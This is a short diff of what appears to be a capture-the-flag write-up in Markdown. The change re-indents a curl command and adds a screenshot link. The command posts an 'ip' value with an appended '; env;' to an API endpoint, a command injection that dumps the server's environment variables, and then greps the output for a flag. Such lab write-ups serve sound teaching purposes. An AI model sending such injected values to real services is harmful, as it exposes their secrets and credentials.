@@ -64,10 +64,10 @@ Other option could be dirb tool:
    ![img_14.png](images/img_14.png)
 
    - Using curl
-```shell
-curl --location --request POST 'https://5xjz0o4hak.execute-api.sa-east-1.amazonaws.com/api/oratoroeuaroupadoreideroma/status' --header 'Content-Type: text/plain' --data-raw '{"ip": "192.168.15.1; env;"}' --silent | egrep -i flag
-```
-
+   ```shell
+   curl --location --request POST 'https://5xjz0o4hak.execute-api.sa-east-1.amazonaws.com/api/oratoroeuaroupadoreideroma/status' --header 'Content-Type: text/plain' --data-raw '{"ip": "192.168.15.1; env;"}' --silent | egrep -i flag
+   ```
+   ![img_15.png](images/img_15.png)
 
  
 
